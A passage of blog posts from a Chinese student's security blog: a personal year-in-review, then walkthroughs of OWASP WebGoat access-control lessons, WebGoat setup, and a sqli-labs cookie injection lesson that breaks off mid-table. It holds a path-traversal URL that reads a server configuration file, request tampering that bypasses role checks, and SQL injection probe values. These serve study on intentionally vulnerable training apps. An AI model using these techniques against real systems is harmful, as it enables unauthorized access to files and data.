[{"title":"2017。。。","url":"http://huirong.github.io/2017/02/17/2017/","content":"<p>距离上次更新博客，已经好久了，期间经历找工作、开题等大事，享受了人生中最后一个寒假。</p>\n<h1 id=\"1-找工作\"><a href=\"#1-找工作\" class=\"headerlink\" title=\"1 找工作\"></a>1 找工作</h1><p>工作找的基本满意吧，纯安全。</p>\n<p>找工作是，对是否继续从事安全领域的工作犹豫了好久，毕竟现在设立安全部门的公司少之又少，根据我实习面试经验，好多公司的安全都是隶属于运维部门的，然后像BAT这种大公司的安全部门，又好难进（可惜我只是个渣渣，只有膜拜大神的份O(∩_∩)O~~）。</p>\n<p>某次鬼使神差的面试了网易的测试岗位（网易安全岗在杭州，杭州是我理想居住城市的NO1，但由于某种原因一门心思想去帝都工作），面试官看了我的简历，就开始谈人生谈理想，觉得我去做测试可惜了，安全是个很有发展前景的行业，往后各大公司都会越来越重视安全（我是不能再赞同了），第一份工作不能随便，一定要找个自己感兴趣的行业，而且安全工资比测试公司高（这个我也不太清楚）。。。。。。。特别感谢网易测试部门面试官，从此坚定了我找安全岗的决定，还好是提前批，各大公司的正式招聘还没开始，不然可就亏大发了，<font color=\"red\">在此提醒各位找工作的朋友，一定要想清楚自己到底想从事哪方面的工作，</font>不要胆怯，确定了目标，勇往直前，也希望更多的人从事安全行业。</p>\n<p>确定职业规划后，拓宽了安全知识面，不过 leetcode 刷题从未断过（惭愧的是，到现在还没刷完，只刷了2/3左右），牛客网上《剑指offer》专题刷完了。</p>\n<h1 id=\"2-学习\"><a href=\"#2-学习\" class=\"headerlink\" title=\"2 学习\"></a>2 学习</h1><p>工作和开题结束后，快到12月了（好吧，找工作结束之后，放松了许久），才开始学习。</p>\n<p>结合王爽老师的《汇编语言》和小甲鱼的视频教程《零基础学习汇编语言》系统学习了汇编语言，又破解了 160个CrackMe 几个简单的，算是温习下汇编，觉得自己学习的太基础了，也没整理成博客。</p>\n<p>接着学习看雪出版的《加密与解密》，PE文件格式在放假之前学习完毕，这个章节过于复杂，实在想不出如何整理成博客，以后需要的时候，翻翻书好了。<br>按顺序学习构化异常处理，但《加密与解密》关于结构化异常处理的知识点是在不敢恭维，然后学习了《Windows核心编程》和《软件加密技术内幕》的结构化异常处理。</p>\n<h1 id=\"3-期望\"><a href=\"#3-期望\" class=\"headerlink\" title=\"3 期望\"></a>3 期望</h1><p>今年六月底就要毕业了，彻底结束学生生涯，踏上人生的另一个旅程，方向也要稍微转变一下，从原先的逆向到Web安全。不过看知乎上牛人说，往后会逆向的Web安全人才最有前途，希望我两方面都不要落下，在安全届越走越远，成为安全界的大牛。</p>\n<p>也希望了除了学习之后，能有一个特长吧，能拿得出手的只有羽毛球了，可也是小打小闹，毕竟我们实验室拿了两届羽毛球比赛的冠军，而我每次都是替补队员ヾ(≧O≦)〃嗷~，跟大神比起来，我真是业余中的业余，希望这一年，好好练习羽毛球。<br>15年某几个月，坚持每天画一幅简笔画（凭我的水平，也只能画简笔画，汗颜），后来也荒废了。哎，真是缺乏毅力<del>~</del>~<br>从读研这几年，依然保留着的只有看小说了，上百篇吧。细细想想找工作期间看的小说最多了，那段时间压力特别大，晚上睡不着，早上一点动静就醒，只能靠小说缓解压力，到自己特别累了，才能入睡（这不是个解压的好办法，不要学我，黑眼圈到现在依然很重 ┭┮﹏┭┮ ，白头发又多了不少┭┮﹏┭┮ ）。希望以后能看些大神的经典名著，感受下大师的文笔，不再是拍成电视后才为人知晓的小说。</p>\n<p>从小语文就不怎么样，文笔更是一言难尽，纯属记录下这段时间的生活，不喜就喷吧，反正我也不知道。。。。</p>\n"},{"title":"WebGoat 学习 -- Access Control Flaws（访问控制缺陷）","url":"http://huirong.github.io/2016/09/08/WebGoat-AccessControlFlaws/","content":"<p>访问控制知识点可参考 <a href=\"http://www.cec-ceda.org.cn/information/book/info_6.htm\" target=\"_blank\" rel=\"external\">第六章 访问控制</a><br><a id=\"more\"></a></p>\n<h1 id=\"1-Using-an-Access-Control-Matrix（使用访问控制模型）\"><a href=\"#1-Using-an-Access-Control-Matrix（使用访问控制模型）\" class=\"headerlink\" title=\"1 Using an Access Control Matrix（使用访问控制模型）\"></a>1 Using an Access Control Matrix（使用访问控制模型）</h1><p>在基于角色的访问控制方案中，一个角色表示一组访问权限和特权，一个用户可以分配一个或多个角色。基于角色的访问控制方案通常由两部分组成：角色权限管理和角色分配。<br>一个被破坏的方案控制方案可能允许用户执行不在他/她分配的角色范围内的访问，或以某种方式允许特权升级到未经授权的角色。</p>\n<h2 id=\"1-1-General-Goal-s-目标\"><a href=\"#1-1-General-Goal-s-目标\" class=\"headerlink\" title=\"1.1 General Goal(s) 目标\"></a>1.1 General Goal(s) 目标</h2><p>每个用户都是角色的成员，每个角色允许访问特定资源。<br>本课程的目标是探索管理此网站使用的访问控制规则，只有 “Admin” 组才有 “Account Manager(账户管理)” 资源。</p>\n<h2 id=\"1-2-探索\"><a href=\"#1-2-探索\" class=\"headerlink\" title=\"1.2 探索\"></a>1.2 探索</h2><p>在上一节 General 中，设置了代理，本小节不需要设置代理，记得取消代理。</p>\n<ul>\n<li><p>先选择一个用户，在选择一个资源，点击【Check Access】按钮<br>  <img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f7m0zycfgoj30ir046aae.jpg\" alt=\"\"></p>\n<p>  <code>* User Moe [Public] was allowed to access resource Public Share</code><br>  共有用户 Moe 对资源 Public Share 有访问权限</p>\n</li>\n<li><p>继续测试用户的访问控制权限，选择用户和资源，点击【Check Access】<br>  <img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f7m2rfvuzuj30ir047aaj.jpg\" alt=\"\"></p>\n<p>  共有用户 Moe 没有访问资源 Performance Review 的权限。</p>\n</li>\n<li><p>继续测试<br>  <img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7m2rxfw6lj30ir04ujs8.jpg\" alt=\"\"></p>\n<p>  恭喜你，成功完成本课程。<br>  用户 Larry 对资源Account Manager 具有访问权限时。<br>  同时左侧菜单栏看到醒目的绿色图标——过关标志。</p>\n</li>\n</ul>\n<h1 id=\"2-Bypass-a-Path-Based-Access-Control-Scheme-绕过基于路径的访问控制方案\"><a href=\"#2-Bypass-a-Path-Based-Access-Control-Scheme-绕过基于路径的访问控制方案\" class=\"headerlink\" title=\"2 Bypass a Path Based Access Control Scheme(绕过基于路径的访问控制方案)\"></a>2 Bypass a Path Based Access Control Scheme(绕过基于路径的访问控制方案)</h1><p>在一个基于路径的访问控制方案中，攻击者可以通过提供相对路径信息遍历路径。因此，攻击者可以使用相对路径访问那些通常任何人都不能直接访问或直接请求就会被拒绝的文件。</p>\n<h2 id=\"2-1-General-Goal-s-目标\"><a href=\"#2-1-General-Goal-s-目标\" class=\"headerlink\" title=\"2.1 General Goal(s) 目标\"></a>2.1 General Goal(s) 目标</h2><p>用户 ‘guest’ 具有访问 lessonPlans/en 目录下所有文件的权限。我们需要尝试突破访问控制侧路，访问不在下列清单中的文件。<br>选中一个文件，点击【View File】按钮，WebCoat会提示是否具有访问该文件的权限，可是试着访问“WEB-INF/spring-security.xml”文件。注意：该文件的位置取决于您正在使用的WebGoat 版本和环境。</p>\n<h2 id=\"2-2-绕过实验\"><a href=\"#2-2-绕过实验\" class=\"headerlink\" title=\"2.2 绕过实验\"></a>2.2 绕过实验</h2><h3 id=\"2-2-1-测试\"><a href=\"#2-2-1-测试\" class=\"headerlink\" title=\"2.2.1 测试\"></a>2.2.1 测试</h3><p>随便打击框框中的一个文件，然后【View File】，页面上方红色的有提示，下面显示页面的具体内容</p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7m5qdo181j30iu0g3tbd.jpg\" alt=\"\"></p>\n<h3 id=\"2-2-2-使用-WebScarab-拦截并修改\"><a href=\"#2-2-2-使用-WebScarab-拦截并修改\" class=\"headerlink\" title=\"2.2.2 使用 WebScarab 拦截并修改\"></a>2.2.2 使用 WebScarab 拦截并修改</h3><p>在使用 WebScarab 前，记得设置浏览器的代理。</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f7m6fggkpgj30l90e5n03.jpg\" alt=\"\"></p>\n<p>URL 为 <code>http://localhost:8080/WebGoat/attack?Screen=320&amp;menu=200&amp;File=DOMXSS.html&amp;SUBMIT=View+File</code>  </p>\n<p>File 的值即为想要访问的文件名，修改这个文件为 WEB-INF/spring-security.xml 的路径，<code>http://localhost:8080/WebGoat/attack?Screen=320&amp;menu=200&amp;File=../../../../../WEB-INF/spring-security.xml&amp;SUBMIT=View+File</code></p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f7m6n08zdtj30l90e5juh.jpg\" alt=\"\"></p>\n<p>然后点击 【Accept changes】之后查看浏览器内容</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f7m78tp2u1j30qy0ar78d.jpg\" alt=\"\"></p>\n<ul>\n<li>页面上显示 spring-security.xml 的绝对路径，还有恭喜通过本课程的提示！！！！</li>\n<li>下方是 spring-security.xml 的内容。</li>\n<li>左侧菜单栏醒目的绿色图标——过关标志。</li>\n</ul>\n<font color=\"red\"> 不同机器和环境，spring-security.xml的目录不同 </font>\n\n<h1 id=\"3-LAB-Role-Based-Access-Control\"><a href=\"#3-LAB-Role-Based-Access-Control\" class=\"headerlink\" title=\"3 LAB:Role Based Access Control\"></a>3 LAB:Role Based Access Control</h1><p>很多网站都尝试使用基于角色的方式严格限制资源访问，但开发人员在实现这类解决方案时容易出现疏忽。</p>\n<h2 id=\"3-1-Stage-1-Bypass-Presentational-Layer-Access-Control\"><a href=\"#3-1-Stage-1-Bypass-Presentational-Layer-Access-Control\" class=\"headerlink\" title=\"3.1 Stage 1: Bypass Presentational Layer Access Control\"></a>3.1 Stage 1: Bypass Presentational Layer Access Control</h2><h3 id=\"3-1-1-General-Goal（目标）\"><a href=\"#3-1-1-General-Goal（目标）\" class=\"headerlink\" title=\"3.1.1 General Goal（目标）\"></a>3.1.1 General Goal（目标）</h3><p>即：绕过表示层访问控制。</p>\n<p>Tom 是一名普通员工，利用脆弱的访问控制策略在员工列表页面中执行 Delete（删除）功能。验证 Tom 的 profile（个人档案）可以被删除。<br>每个用户的密码是该用户名的小写字母（Tom Cat 的密码为 tom）。</p>\n<p>该公司内部员工层次图：</p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f7mi0pmp1pj30h40c675u.jpg\" alt=\"\"></p>\n<p>访问控制矩阵如下：</p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7mi185ydjj30n40770tj.jpg\" alt=\"\"></p>\n<h3 id=\"3-1-2-初探\"><a href=\"#3-1-2-初探\" class=\"headerlink\" title=\"3.1.2 初探\"></a>3.1.2 初探</h3><p>通过员工层次图和访问控制矩阵可以发现，员工的所有上司（直系或非直系）都具有删除其 profile 的权限。以 Tom 的直系上司 Jerry Mouse 的身份登录：</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f7mhne9n7lj30h80br75b.jpg\" alt=\"\"></p>\n<p>设置浏览器代理，然后开启 WebScarab，选中 Joanne McDougal ，点击 【DeleteProfile】，观察 WebScarab 拦截到的信息：</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f7mhtgltbwj30l10du41m.jpg\" alt=\"\"></p>\n<p>然后点击【Abort request】终止请求，回到浏览器点击【ViewProfile】，观察 WebScarab 拦截到的信息：</p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7mhy5p43dj30l10dun0a.jpg\" alt=\"\"></p>\n<p>多次实验，发现同一个用户，点击不同的操作，只有 action 参数不同。</p>\n<h3 id=\"3-1-3-验证\"><a href=\"#3-1-3-验证\" class=\"headerlink\" title=\"3.1.3 验证\"></a>3.1.3 验证</h3><p>为了验证 Tom 的 profile（个人档案）可以被删除，以 Tom 身份登录，点击【ViewProfile】，尝试使用 WebScarab 拦截请求，修改 action 参数。</p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7mi3ucyovj30h80b0mxy.jpg\" alt=\"\"></p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f7mi4liz17j30l10duad6.jpg\" alt=\"\"></p>\n<p>修改 action 参数，然后点击【Accept changes】</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f7mid0kzjcj30l10du0vu.jpg\" alt=\"\"></p>\n<p>返回到浏览器，发现通关了 (^o^)/YES!</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f7mi9xyk63j30mt0e3diu.jpg\" alt=\"\"></p>\n<h2 id=\"3-2-stage2：Add-Business-Layer-Access-Control\"><a href=\"#3-2-stage2：Add-Business-Layer-Access-Control\" class=\"headerlink\" title=\"3.2 stage2：Add Business Layer Access Control\"></a>3.2 stage2：Add Business Layer Access Control</h2><p>添加业务层访问控制。</p>\n<font color=\"red\"> 本课程只适用于 WebGoat 开发版。</font>\n\n<p>本课程是修改 stage 1 的 bug，拒绝未经授权的用户使用 Delete 功能，为此一定要修改 WebGoat 源码。<br>修复成功后，可以返回 stage 1 验证是否拒绝未经授权的使用 delete 功能。</p>\n<p>由于 WebGoat 源码是用 Java 写的，我是 Java 小白，so 本教程暂且搁置。</p>\n<h2 id=\"3-3-stage3-Bypass-Data-Layer-Access-Control\"><a href=\"#3-3-stage3-Bypass-Data-Layer-Access-Control\" class=\"headerlink\" title=\"3.3 stage3: Bypass Data Layer Access Control\"></a>3.3 stage3: Bypass Data Layer Access Control</h2><p>绕过数据层访问控制</p>\n<p>使用 Tom 身份登录进系统，点击【ViewProfile】，看到 Tom 的个人信息：<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f7yzr03cl0j30go0b5gn7.jpg\" alt=\"\"></p>\n<p>WebScarab 抓包查看数据：<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f7yzukia87j30l10du41m.jpg\" alt=\"\"></p>\n<p>修改 employee_id 的值，110（随机选取）<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f7yzxvcch5j30go0b7wgi.jpg\" alt=\"\"></p>\n<p>OK，页面上成功显示编号为 110 的员工个人信息。<br>观察页面，有通关提醒 Y(^o^)Y</p>\n<h2 id=\"3-4-stage2：Add-Data-Layer-Access-Control\"><a href=\"#3-4-stage2：Add-Data-Layer-Access-Control\" class=\"headerlink\" title=\"3.4 stage2：Add Data Layer Access Control\"></a>3.4 stage2：Add Data Layer Access Control</h2><p>添加业务层访问控制。</p>\n<font color=\"red\"> 本课程只适用于 WebGoat 开发版。</font>\n\n<p>本课程是修改 stage 3 的 bug，我是 Java 小白，so 本教程暂且搁置。</p>\n"},{"title":"WebGoat 学习 -- General","url":"http://huirong.github.io/2016/09/07/WebGoat-General/","content":"<h1 id=\"1-工具与插件\"><a href=\"#1-工具与插件\" class=\"headerlink\" title=\"1 工具与插件\"></a>1 工具与插件</h1><h2 id=\"1-1-WebScarab\"><a href=\"#1-1-WebScarab\" class=\"headerlink\" title=\"1.1 WebScarab\"></a>1.1 WebScarab</h2><h3 id=\"1-1-1-简介\"><a href=\"#1-1-1-简介\" class=\"headerlink\" title=\"1.1.1 简介\"></a>1.1.1 简介</h3><p>WebScarab 是一个用来分析由浏览器提交到服务器请求，以及服务器对浏览器做出的响应的应用服务框架，也可以当做一个代理工具，或者说就是一个代理。使用者可以利用 WebScarab 看、分析、修改、创建所截取的浏览器与服务器之间的请求与响应，也可以用来分析HTTP 与HTTPS 协议。</p>\n<p>网页的对话输入框中可能存在某些限制，比如长度，格式等等。现在使用者可以在 WebScarab 截获请求对话框中对其进行修改；还可以利用WebScarab 对网站进行注入型攻击，以测试网站的安全性。</p>\n<p>WebScarab 也是WebGoat 的一个辅助工具，在WebGoat 进行某些漏洞攻击时，可以利用 WebScarab 分析，修改所提交的请求，以及返回的响应。</p>\n<p>但是 WebScarab 工具好像在七八年前就停止更新了，大家可以选择更好的工具。。。。</p>\n<h3 id=\"1-1-2-安装\"><a href=\"#1-1-2-安装\" class=\"headerlink\" title=\"1.1.2 安装\"></a>1.1.2 安装</h3><ul>\n<li>下载  <a href=\"https://sourceforge.net/projects/owasp/files/WebScarab/\" target=\"_blank\" rel=\"external\">https://sourceforge.net/projects/owasp/files/WebScarab/</a><br>根据系统选择对应的版本，我安装在Linux系统下，下载的是 webscarab-selfcontained-20070504-1631.jar</li>\n<li>安装 首先要有 JRE 环境，上一节已经安装了 JDK，所以可以使用命令直接运行 <code>java -jar webscarab-selfcontained-20070504-1631.jar</code></li>\n</ul>\n<h2 id=\"1-2-Firebug\"><a href=\"#1-2-Firebug\" class=\"headerlink\" title=\"1.2 Firebug\"></a>1.2 Firebug</h2><p>相信对 Web 安全有一定了解的人，对 Firebug 一定不陌生。</p>\n<p>Firebug 是Firefox 下的一个插件,能够调试所有网站语言,如HTML,CSS 等，但FireBug 最吸引人的就是 JavaScript 调试功能，使用起来非常方便，而且在各种浏览器下都能使用（IE,Firefox,Opera, Safari）。除此之外，还有其他强大的功能，比如HTML,CSS,DOM 的察看与调试，网站整体分析等等。总之，就是一套完整而强大的 WEB 开发工具。再有就是其为开源的软件。</p>\n<h1 id=\"2-General（Http-Basic（Http-基础知识））\"><a href=\"#2-General（Http-Basic（Http-基础知识））\" class=\"headerlink\" title=\"2 General（Http Basic（Http 基础知识））\"></a>2 General（Http Basic（Http 基础知识））</h1><h2 id=\"2-1-总体目标\"><a href=\"#2-1-总体目标\" class=\"headerlink\" title=\"2.1 总体目标\"></a>2.1 总体目标</h2><p>在页面下方的输入框中输入你的名字，点击【Go!】按钮提交。服务器接收请求，并逆置你的输入，并将结果返回给客户端，显示在页面的输入框中。该过程主要是展示 HTTP 请求的基本操作原理。</p>\n<p>点击页面上方的按钮可以查看：Java 源代码、提<br>示信息、HTTP 请求参数、HTTP 请求 Cookies 。您也可以在首次使用时尝<br>试使用工具WebScarab。</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f7lcb90i5fj30gr040q3a.jpg\" alt=\"\"></p>\n<h2 id=\"2-2-Http-工作原理\"><a href=\"#2-2-Http-工作原理\" class=\"headerlink\" title=\"2.2 Http 工作原理\"></a>2.2 Http 工作原理</h2><p>所有的HTTP 传输遵循同样的通用格式，每个客户端的请求和服务端的响应都有三个部分:  <font color=\"red\"> 请<br>求或响应行、一个报头部分、实体部分 </font> 。客户端以如下方式启动一个交互：</p>\n<ul>\n<li>客户端连接服务器并发送一个文件请求<br>  <code>GET /index.html?param=value HTTP/1.0</code></li>\n<li>客户端发送可选头信息，告知接收服务器其配置和文件格式。<br>  <code>User-Agent: Mozilla/4.06 Accept: image/gif, image/jpeg, */*</code></li>\n<li>发送请求和报头之后，客户端可以发送更多的数据。该数据主要用于使用POST 方法的<br>CGI 程序。</li>\n</ul>\n<h2 id=\"2-3-WebScarab-拦截并分析\"><a href=\"#2-3-WebScarab-拦截并分析\" class=\"headerlink\" title=\"2.3 WebScarab 拦截并分析\"></a>2.3 WebScarab 拦截并分析</h2><ul>\n<li><p>在浏览器中手动配置代理，然后启动 WebScarab：</p>\n  <font color=\"red\"> 代理端口为 8008，我刚开始写错了，一直拦截不到信息(╯﹏╰) </font>\n\n<p>  <img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f7lx3ageg0j30f50hcmzc.jpg\" alt=\"\"></p>\n</li>\n<li><p>然后在 WebScarab 的 Intercept 中选取 Intercept requests ，设置拦截请求：</p>\n<p>  <img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f7lxbj6sfqj30hz0eoq4g.jpg\" alt=\"\"></p>\n</li>\n<li><p>在输入框中输入你的名字，点击【Go!】按钮。然后观察 WebScarab 的新窗口中。</p>\n<p>  <img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f7lx9mqoe4j30i20eqq5r.jpg\" alt=\"\"></p>\n</li>\n<li><p>回到浏览器，页面提示成功完成本课程，左侧菜单栏看到醒目的绿色图标——过关标志。</p>\n<p>  <img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f7lxqx5enhj30lz0bf77d.jpg\" alt=\"\"></p>\n</li>\n</ul>\n<p>OK，果然第一个课程很简单，感觉主要是为了熟悉 WebGoat 环境 o(〃’▽’〃)o</p>\n"},{"title":"WebGoat 安装","url":"http://huirong.github.io/2016/09/07/WebGoat-install/","content":"<p>WebGoat 是 OWASP 组织研制出的用于进行 web 漏洞实验的应用平台，用来说明 web 应用中存在的安全漏洞。<br><a id=\"more\"></a></p>\n<h1 id=\"1-WebGoat-简介\"><a href=\"#1-WebGoat-简介\" class=\"headerlink\" title=\"1 WebGoat 简介\"></a>1 WebGoat 简介</h1><p>WebGoat 运行在带有java 虚拟机的平台之上，当前提供的训练课程有30 多个，其中包括：跨站点脚本攻击（XSS）、访问控制、线程安全、操作隐藏字段、操纵参数、弱会话cookie、SQL 盲注、数字型SQL 注入、字符串型SQL 注入、web 服务、Open Authentication 失效、危险的HTML 注释等等。</p>\n<h1 id=\"2-OWASP-简介\"><a href=\"#2-OWASP-简介\" class=\"headerlink\" title=\"2 OWASP 简介\"></a>2 OWASP 简介</h1><p>OWASP 是一个开放式Web 应用程序安全项目（OWASP，Open Web Application Security Project）组织，它提供有关计算机和互联网应用程序的公正、实际、有成本效益的信息。其目的是协助个人、企业和机构来发现和使用可信赖的软件。</p>\n<p>开放式Web 应用程序安全项目（OWASP）是一个非营利组织，不附属于任何企业或财团。因此，由OWASP 提供和开发的所有设施和文件都不受商业因素的影响。</p>\n<h1 id=\"3-安装-升级-JDK\"><a href=\"#3-安装-升级-JDK\" class=\"headerlink\" title=\"3 安装/升级 JDK\"></a>3 安装/升级 JDK</h1><p>WebGoat 运行在带有java 虚拟机的平台上，因此需要安装 JDK。<br>而且如果版本过低，会出错，最好还是升级 JDK 到最新版。升级 JDK 步骤和安装相同，不用卸载原来的 JDK。</p>\n<font color=\"red\"> 如果是在 Windows 下安装，可自行绕过此步骤，毕竟双击 exe 谁都会<del>~</del> </font>\n\n<p>我原装 JDK 如下：<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f7l54687c4j30j5025wez.jpg\" alt=\"\"></p>\n<p>JDK 版本太低，在后续运行 WebGoat 出错，所以需要升级。</p>\n<h2 id=\"3-1-下载\"><a href=\"#3-1-下载\" class=\"headerlink\" title=\"3.1 下载\"></a>3.1 下载</h2><p>下载最新版 JDK，网址 <a href=\"http://www.oracle.com/technetwork/java/index.html\" target=\"_blank\" rel=\"external\">http://www.oracle.com/technetwork/java/index.html</a><br>根据自己的机型选择对应的版本。</p>\n<p>将安装包移动到 <code>/usr/local/java</code> 目录下，并解压。<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f7l4tebd2qj30gt02mq3e.jpg\" alt=\"\"></p>\n<h2 id=\"3-2-修改环境变量\"><a href=\"#3-2-修改环境变量\" class=\"headerlink\" title=\"3.2 修改环境变量\"></a>3.2 修改环境变量</h2><p>修改 <code>/etc/profile</code> 配置文件，在文件末尾添加如下代码，不要修改其他部分。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">JAVA_HOME=<span class=\"string\">\"/usr/local/java/jdk1.8.0_101\"</span></div><div class=\"line\">CLASSPATH=<span class=\"string\">\"./:/usr/local/java/jdk1.8.0_101/lib\"</span></div><div class=\"line\">PATH=<span class=\"variable\">$PATH</span>:<span class=\"variable\">$JAVA_HOME</span>/bin:<span class=\"variable\">$CLASSPATH</span></div><div class=\"line\"><span class=\"built_in\">export</span> PATH</div></pre></td></tr></table></figure></p>\n<p>可能大家下载的 jdk 版本和我的不同，根据自己的修改jdk版本号。</p>\n<p>保存并退出，<code>source /etc/profile</code></p>\n<h2 id=\"3-3-设置成系统默认的jdk\"><a href=\"#3-3-设置成系统默认的jdk\" class=\"headerlink\" title=\"3.3 设置成系统默认的jdk\"></a>3.3 设置成系统默认的jdk</h2><figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">update-alternatives --install <span class=\"meta-keyword\">/usr/</span>bin/javac javac <span class=\"meta-keyword\">/usr/</span>local<span class=\"meta-keyword\">/java/</span>jdk1<span class=\"number\">.8</span><span class=\"number\">.0</span>_101<span class=\"meta-keyword\">/bin/</span>javac <span class=\"number\">1071</span></div><div class=\"line\">update-alternatives --install <span class=\"meta-keyword\">/usr/</span>bin/java java <span class=\"meta-keyword\">/usr/</span>local<span class=\"meta-keyword\">/java/</span>jdk1<span class=\"number\">.8</span><span class=\"number\">.0</span>_101<span class=\"meta-keyword\">/bin/</span>java <span class=\"number\">1071</span></div><div class=\"line\">update-alternatives --config java</div></pre></td></tr></table></figure>\n<p>最后一个 –config java 命令，shell会提示你选择哪个jdk作为默认的jdk，第一个带 * ，就是刚才设置的，直接enter就可以了。</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f7l5azp2crj30s0045abh.jpg\" alt=\"\"></p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f7l5b917d5j30s00633zw.jpg\" alt=\"\"></p>\n<h2 id=\"3-4-查看是否安装-升级成功\"><a href=\"#3-4-查看是否安装-升级成功\" class=\"headerlink\" title=\"3.4 查看是否安装/升级成功\"></a>3.4 查看是否安装/升级成功</h2><p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7l5citwzzj30gy02lwes.jpg\" alt=\"\"><br>说明安装/升级成功！！！！！</p>\n<h1 id=\"4-安装-WebGoat\"><a href=\"#4-安装-WebGoat\" class=\"headerlink\" title=\"4 安装 WebGoat\"></a>4 安装 WebGoat</h1><p>下载简易安装 jar 可执行文件<br><a href=\"https://s3.amazonaws.com/webgoat-war/webgoat-container-7.0-SNAPSHOT-war-exec.jar\" target=\"_blank\" rel=\"external\">https://s3.amazonaws.com/webgoat-war/webgoat-container-7.0-SNAPSHOT-war-exec.jar</a></p>\n<p>在终端运行如下命令：<br><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-tag\">java</span> <span class=\"selector-tag\">-jar</span> <span class=\"selector-tag\">webgoat-container-7</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1-war-exec</span><span class=\"selector-class\">.jar</span></div></pre></td></tr></table></figure></p>\n<p>在浏览器访问 <a href=\"http://localhost:8080/WebGoat\" target=\"_blank\" rel=\"external\">http://localhost:8080/WebGoat</a><br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f7l5i4d4kij30rz0ir405.jpg\" alt=\"\"></p>\n<p>可根据页面下方的用户名和密码登录 O(∩_∩)O~~</p>\n<h1 id=\"5-参考文献\"><a href=\"#5-参考文献\" class=\"headerlink\" title=\"5 参考文献\"></a>5 参考文献</h1><p><a href=\"https://github.com/WebGoat/WebGoat/blob/master/README.MD\" target=\"_blank\" rel=\"external\">WebGoat: A deliberately insecure Web Application</a><br><a href=\"http://www.cnblogs.com/chineseboy/archive/2013/05/07/3064873.html\" target=\"_blank\" rel=\"external\">debian 6 安装 JDK 、eclipse、 SDK 笔记</a></p>\n"},{"title":"sqli labs lesson 20~21 学习","url":"http://huirong.github.io/2016/08/31/sqli-labs-series-lesson20-21/","content":"<p>为了找工作，前几天重温了下背包九讲，现在继续学习sql注入。<br><a id=\"more\"></a></p>\n<h1 id=\"1-lesson-20-cookie注入-基于错误\"><a href=\"#1-lesson-20-cookie注入-基于错误\" class=\"headerlink\" title=\"1 lesson 20 cookie注入-基于错误\"></a>1 lesson 20 cookie注入-基于错误</h1><p>此时，无论用户名、密码以什么格式输入，在后面加单引号’，双引号”，注释符#，页面都不会报错。</p>\n<p>在页面上输入普通用户 用户名和密码之后，显示如下<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7fkm2fcwxj30zn0a9q7f.jpg\" alt=\"\"></p>\n<p>USER AGENT,cookie,username,password,id等信息显示在页面上</p>\n<h1 id=\"1-1-测试cookie\"><a href=\"#1-1-测试cookie\" class=\"headerlink\" title=\"1.1 测试cookie\"></a>1.1 测试cookie</h1><p>使用 EditThisCookie 插件查看cookie值<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f7fkqai00tj30fm0ardgv.jpg\" alt=\"\"></p>\n<p>cookie 值为 Dumb，编辑cookie，观察页面显示：<br>在 Dumb 后面添加单引号 ‘, 即 cookie 值为 <code>Dumb&#39;</code><br>然后刷新页面<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7fks7dy43j311r09d0xy.jpg\" alt=\"\"><br>出现错误：<code>Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;Dumb&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>\n<p>cookie 值：<code>Dumb&quot;</code><br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f7fku8u59qj31000ggdma.jpg\" alt=\"\"><br>提示不太友好，就不解释了<del>~</del><br>总之没有语法错误。</p>\n<p>初步断定 <font color=\"red\"> cookie 是以单引号’ 闭合的</font></p>\n<table>\n<thead>\n<tr>\n<th>cookie 值</th>\n<th>页面情况</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>Dumb&#39;#</code></td>\n<td>页面显示正常</td>\n</tr>\n<tr>\n<td><code>Dumb&#39; order by 